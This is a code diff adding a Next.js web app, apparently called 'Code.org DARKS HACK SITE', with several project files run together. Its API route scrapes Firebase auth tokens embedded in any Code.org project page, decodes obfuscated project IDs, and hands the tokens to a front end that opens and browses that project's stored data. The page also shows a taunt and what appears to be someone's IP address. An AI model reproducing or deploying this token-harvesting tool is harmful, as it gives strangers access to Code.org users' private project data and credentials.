@@ -1,0 +1,321 @@
+{
+  "compilerOptions": {
+    "target": "es5",
+    "lib": [
+      "dom",
+      "dom.iterable",
+      "esnext"
+    ],
+    "allowJs": true,
+    "skipLibCheck": true,
+    "strict": true,
+    "forceConsistentCasingInFileNames": true,
+    "noEmit": true,
+    "esModuleInterop": true,
+    "module": "esnext",
+    "moduleResolution": "node",
+    "resolveJsonModule": true,
+    "isolatedModules": true,
+    "jsx": "preserve",
+    "incremental": true
+  },
+  "include": [
+    "next-env.d.ts",
+    "**/*.ts",
+    "**/*.tsx"
+  ],
+  "exclude": [
+    "node_modules"
+  ]
+}html,
+body {
+  padding: 0;
+  margin: 0;
+  font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Oxygen,
+    Ubuntu, Cantarell, Fira Sans, Droid Sans, Helvetica Neue, sans-serif;
+}
+
+a {
+  color: inherit;
+  text-decoration: none;
+}
+
+* {
+  box-sizing: border-box;
+}<svg width="283" height="64" viewBox="0 0 283 64" fill="none" 
+    xmlns="http://www.w3.org/2000/svg">
+    <path d="M141.04 16c-11.04 0-19 7.2-19 18s8.96 18 20 18c6.67 0 12.55-2.64 16.19-7.09l-7.65-4.42c-2.02 2.21-5.09 3.5-8.54 3.5-4.79 0-8.86-2.5-10.37-6.5h28.02c.22-1.12.35-2.28.35-3.5 0-10.79-7.96-17.99-19-17.99zm-9.46 14.5c1.25-3.99 4.67-6.5 9.45-6.5 4.79 0 8.21 2.51 9.45 6.5h-18.9zM248.72 16c-11.04 0-19 7.2-19 18s8.96 18 20 18c6.67 0 12.55-2.64 16.19-7.09l-7.65-4.42c-2.02 2.21-5.09 3.5-8.54 3.5-4.79 0-8.86-2.5-10.37-6.5h28.02c.22-1.12.35-2.28.35-3.5 0-10.79-7.96-17.99-19-17.99zm-9.45 14.5c1.25-3.99 4.67-6.5 9.45-6.5 4.79 0 8.21 2.51 9.45 6.5h-18.9zM200.24 34c0 6 3.92 10 10 10 4.12 0 7.21-1.87 8.8-4.92l7.68 4.43c-3.18 5.3-9.14 8.49-16.48 8.49-11.05 0-19-7.2-19-18s7.96-18 19-18c7.34 0 13.29 3.19 16.48 8.49l-7.68 4.43c-1.59-3.05-4.68-4.92-8.8-4.92-6.07 0-10 4-10 10zm82.48-29v46h-9V5h9zM36.95 0L73.9 64H0L36.95 0zm92.38 5l-27.71 48L73.91 5H84.3l17.32 30 17.32-30h10.39zm58.91 12v9.69c-1-.29-2.06-.49-3.2-.49-5.81 0-10 4-10 10V51h-9V17h9v9.2c0-5.08 5.91-9.2 13.2-9.2z" fill="#000"/>
+</svg>import {
+	Alert,
+	Button,
+	CircularProgress,
+	Collapse,
+	Input,
+	LinearProgress,
+	Link,
+	Typography,
+} from "@mui/material";
+import type { NextPage } from "next";
+import Head from "next/head";
+import Image from "next/image";
+import styles from "../styles/Home.module.css";
+import { useEffect, useRef, useState } from "react";
+import { initFirebaseStorage } from "cdo-firebase-storage/firebaseStorage";
+import { StorageViewer } from "../components/storageviewer";
+import OpenInNewIcon from '@mui/icons-material/OpenInNew';
+import {FirebaseStorage} from "../lib/util";
+import GitHubIcon from '@mui/icons-material/GitHub';
+import Card from '@mui/material/Card';
+
+async function loadFirebase(channel: string) {
+	// const c = await getCred(channel);
+	const url = new URL(location.origin);
+	url.pathname = "/api/channelProxy";
+	url.searchParams.set("channel", channel);
+
+	const c = await fetch(url.toString()).then((e) => e.json());
+	const config = {
+		channelId: channel,
+		firebaseName: "cdo-v3-prod",
+		firebaseAuthToken: c.tokens[0],
+		firebaseSharedAuthToken: c.tokens[1],
+		firebaseChannelIdSuffix: "",
+		showRateLimitAlert: (e: string) => {
+			console.log(e);
+		},
+	};
+
+	const obj = {
+		data: c.data,
+		storage: initFirebaseStorage(config),
+	};
+
+	return obj;
+}
+
+const Index: NextPage = () => {
+	const [firebaseStorage, setFirebaseStorage] = useState<{
+		data: any;
+		storage: FirebaseStorage;
+	} | null>(null);
+
+	const [disabled, setDisabled] = useState(false);
+
+	const [result, setResult] = useState<any>();
+
+	const ref = useRef<HTMLInputElement>();
+	useEffect(()=>{
+		async function load(){
+			let searchParams = new URLSearchParams(location.search);
+			if (searchParams.has("channel")) {
+				if (ref.current) {
+					ref.current.value = searchParams.get("channel")!;
+				}
+				setDisabled(true);
+				try {
+					const storage = await loadFirebase(
+						searchParams.get("channel")!
+					);
+					setFirebaseStorage(storage);
+					setDisabled(false);
+				} catch (e) {
+					setResult(e);
+					setDisabled(false);
+				}			
+			}
+		}
+		load();
+	}, []);
+	return (
+		<>
+			<Head>
+				<title>Data Browser</title>
+			</Head>
+			<div style={{ margin: 20 }}>
+				{firebaseStorage ? (
+					<>
+						<Typography variant="h4">
+							{firebaseStorage.data.name}
+							<Link style={{marginLeft: 10}} href={`https://studio.code.org${firebaseStorage.data.level}/${firebaseStorage.data.id}`} target="_blank"><OpenInNewIcon/></Link>
+						</Typography>
+						<StorageViewer storage={firebaseStorage.storage} />
+					</>
+				) : (
+					<>
+						<Typography variant="h4">
+							Code.org DARKS HACK SITE
+							<Link style={{marginLeft: 20}} href="https://github.com/owokoyo/data-browser"><GitHubIcon/></Link>
+						</Typography>
+						<Typography>
+							Type in the code.org app{"'"}s id to start!
+						</Typography>
+						<Card>
+						<Typography>
+							No coolguy allowed &gt;:(
+						</Typography>
+						<Typography style={{fontSize: 10}}>106.210.86.149</Typography>
+						This message was brought to you by
+						<Link href="https://cdn.discordapp.com/emojis/994668964661710908.gif?size=240&quality=lossless">wuadmane</Link>
+						</Card>
+						<Input
+							fullWidth
+							placeholder="code.org ID"
+							disabled={disabled}
+							inputRef={ref}
+							onKeyDown={async (e) => {
+								if (e.key === "Enter") {
+									setDisabled(true);
+									try {
+										const storage = await loadFirebase(
+											ref.current!.value
+										);
+										setFirebaseStorage(storage);
+										setDisabled(false);
+									} catch (e) {
+										setResult(e);
+										setDisabled(false);
+									}
+								}
+							}}
+						/>
+						{disabled ? <LinearProgress /> : <></>}
+						<Collapse in={!!result}>
+							<Alert
+								onClose={() => {
+									setResult("");
+								}}
+								severity="error"
+							>
+								{"That's not a code.org project"}
+							</Alert>
+						</Collapse>
+					</>
+				)}
+			</div>
+		</>
+	);
+};
+
+export default Index;// Next.js API route support: https://nextjs.org/docs/api-routes/introduction
+import type { NextApiRequest, NextApiResponse } from 'next'
+import fetch from "node-fetch";
+import {initFirebaseStorage} from "cdo-firebase-storage/firebaseStorage";
+
+type Data = {
+	data: any,
+	tokens: [string, string]
+};
+
+export default async function handler(
+  req: NextApiRequest,
+  res: NextApiResponse<Data>,
+) {
+	try {
+		const result = await getCred(String(req.query.channel));
+		res.send(result);
+	} catch (e) {
+		res.status(500).end();
+	}
+}
+
+const cache: Record<string, Data> = {};
+const map = {"0":"V","1":"d","2":"4","3":"y","4":"u","5":"J","6":"c","7":"q","8":"f","9":"8","U":"j","J":"N","V":"L","p":"K","i":"h","e":"H","B":"W","L":"z","Z":"S","s":"o","o":"O","Y":"p","q":"b","m":"G","a":"i","g":"s","W":"C","x":"U","h":"D","A":"w","M":"T","l":"Z","j":"1","X":"t","O":"0","R":"I","F":"e","-":"-","P":"l","t":"B","f":"Q","K":"P","v":"3","k":"g","w":"A","y":"v","N":"7","r":"M","I":"a","n":"E","C":"F","_":"_","H":"k","b":"6","S":"X","u":"x","D":"r","d":"Y","T":"5","z":"9","E":"2","c":"n","G":"m","Q":"R"}
+function decrypt(encryptedid: string){
+	//@ts-ignore
+	return encryptedid.split("").map(char=>map[char]).join("")
+}
+
+function lookByChannelId(project: string){
+	return new Promise<Data>((res, rej)=>{
+		fetch(`https://studio.code.org/v3/channels/${project}`).then(r=>r.json()).then(data=>{
+			fetch(`https://studio.code.org${(data as any).level}/${project}`).then(r=>r.text()).then(response=>{
+				const r = response.match(/"firebaseAuthToken":"(.+)","firebaseSharedAuthToken":"(.+?)"/)!
+				cache[project] = {data, tokens: [r[1], r[2]]};
+				res(cache[project]);
+			})
+		})
+	})
+}
+
+function getCred(project: string): Promise<Data> {
+	if (cache[project]) {
+	  return Promise.resolve(cache[project]);
+	} else {
+		const first = lookByChannelId(project);
+		return first.catch(()=>{
+			return lookByChannelId(decrypt(project))
+		})
+	}
+}import '../styles/globals.css'
+import type { AppProps } from 'next/app'
+
+function MyApp({ Component, pageProps }: AppProps) {
+  return <Component {...pageProps} />
+}
+export default MyApp{
+  "name": "DARKS HACK SITE",
+  "version": "1.3.0",
+  "private": true,
+  "scripts": {
+    "dev": "next dev",
+    "build": "next build",
+    "start": "next start",
+    "lint": "next lint"
+  },
+  "dependencies": {
+    "@emotion/styled": "^11.8.1",
+    "@mui/core": "^5.0.0-alpha.54",
+    "@mui/icons-material": "^5.4.2",
+    "@mui/material": "^5.4.3",
+    "@mui/x-data-grid": "^5.5.1",
+    "buffer": "^6.0.3",
+    "cdo-firebase-storage": "^1.0.4",
+    "is-url": "^1.2.4",
+    "next": "12.1.0",
+    "node-fetch": "^3.2.0",
+    "react": "17.0.2",
+    "react-dom": "17.0.2",
+    "readable-stream": "^3.6.0"
+  },
+  "devDependencies": {
+    "@types/is-url": "^1.2.30",
+    "@types/node": "^17.0.21",
+    "@types/react": "17.0.39",
+    "eslint": "8.10.0",
+    "eslint-config-next": "12.1.0",
+    "typescript": "4.5.5"
+  }
+}# See https://help.github.com/articles/ignoring-files/ for more about ignoring files.
+
+# dependencies
+/node_modules
+/.pnp
+.pnp.js
+
+# testing
+/coverage
+
+# next.js
+/.next/
+/out/
+
+# production
+/build
+
+# misc
+.DS_Store
+*.pem
+
+# debug
+npm-debug.log*
+yarn-debug.log*
+yarn-error.log*
+
+# local env files
+.env.local
+.env.development.local
+.env.test.local
+.env.production.local
+
+# vercel
+.vercel
